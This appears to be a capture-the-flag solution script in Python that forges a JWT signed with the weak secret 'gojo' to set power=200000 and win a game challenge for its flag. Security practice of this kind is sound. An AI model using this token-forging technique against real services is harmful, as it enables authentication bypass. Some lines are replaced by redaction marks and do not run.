#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""新宿决战2 —— JWT HS256 密钥为弱口令 gojo，伪造 power=200000 的 token 一枪通关

链路：
  1) GET / 建 session(battle_id)；
  2) GET /get_token?skill=void 返回 HS256 JWT {"skill":"void","power":180}；
  3) 字典爆破签名密钥 = "gojo"（主题弱口令）；
  4) 用该密钥重签 {"skill":"void","power":200000}，POST /attack 带 Authorization=<REDACTED> <forged>；
  5) 宿傩 200000 HP 一回合归零 → result=victory，响应返回 flag。

用法：python exp.py
"""
import base64
import hashlib
import hmac
import http.cookiejar
import json
import re
import urllib.request
from pathlib import Path

BASE = "http://0ea5rmoupjmy5teu.neu-nex.fun"
SECRET = b"gojo"          # crack_jwt.py 字典命中
EV = Path(__file__).with_name("evidence")
EV.mkdir(exist_ok=True)
FLAG_RE = re.compile(r"(?:flag|nex|FLAG|NEX)\{[^}]+\}")


def b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def sign(payload: dict, secret: bytes = SECRET, header: dict | None = None) -> str:
    h = b64e(json.dumps(header or {"alg": "HS256", "typ": "JWT"},
                        separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64e(sig)}"


def session():
    jar = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    op.open(urllib.request.Request(BASE + "/", headers={"User-Agent": "curl/8.4.0"})).read()
    return op, jar


def attack(op, cookie, token, payload, tag):
    body = json.dumps(payload).encode()
    headers = {"Content-Type": "application/json", "User-Agent": "curl/8.4.0",
               "Authorization": "Bearer " + token}
    r = op.open(urllib.request.Request(BASE + "/attack", data=body, headers=headers, method="POST"))
    txt = r.read().decode()
    (EV / f"{tag}_req.txt").write_text(
        "POST /attack HTTP/1.1\nHost: 0ea5rmoupjmy5teu.neu-nex.fun\n"
        "Content-Type: application/json\nAuthorization=<REDACTED> %s\nCookie=<REDACTED>"
        "Content-Length: %d\n\n%s\n" % (token, cookie, len(body), body.decode()), encoding="utf-8")
    (EV / f"{tag}_resp.txt").write_text("HTTP/1.1 %d\n%s\n\n%s" % (r.status, r.headers, txt),
                                        encoding="utf-8")
    return json.loads(txt)


def run(power, skill, tag):
    op, jar = session()
    cookie=<REDACTED> for c in jar if c.name == "session")
    payload = {"skill": skill, "power": power}
    token=<REDACTED>
    print(f"[*] {tag}: forged payload={payload}  token=<REDACTED>")
    data = attack(op, cookie, token, payload, tag)
    print("    result=%r sukuna_hp=%r gojo_hp=%r flag_key=%r" %
          (data.get("result"), data.get("sukuna_hp"), data.get("gojo_hp"), "flag" in data))
    for line in data.get("log", [])[-4:]:
        print("    log:", line)
    flags = set(FLAG_RE.findall(json.dumps(data, ensure_ascii=False)))
    if data.get("flag"):
        flags.add(data["flag"])
    return data, flags


def main():
    d1, f1 = run(200000, "void", "step2")     # 正好清空宿傩 HP
    d2, f2 = run(999999, "ao", "step3")       # 换技能 + 更大数值，独立复核
    assert d1["result"] == "victory" and d2["result"] == "victory", "未触发胜利"
    assert f1 and f1 == f2, f"两次 flag 不一致: {f1} vs {f2}"
    flag = f1.pop()
    assert FLAG_RE.fullmatch(flag), flag
    assert any(l.startswith("flag:") and l.endswith(flag) for l in d1["log"]), "日志无 flag 原文"
    print("[+] FLAG:", flag)
    (EV / "step2_flag.txt").write_text(flag + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
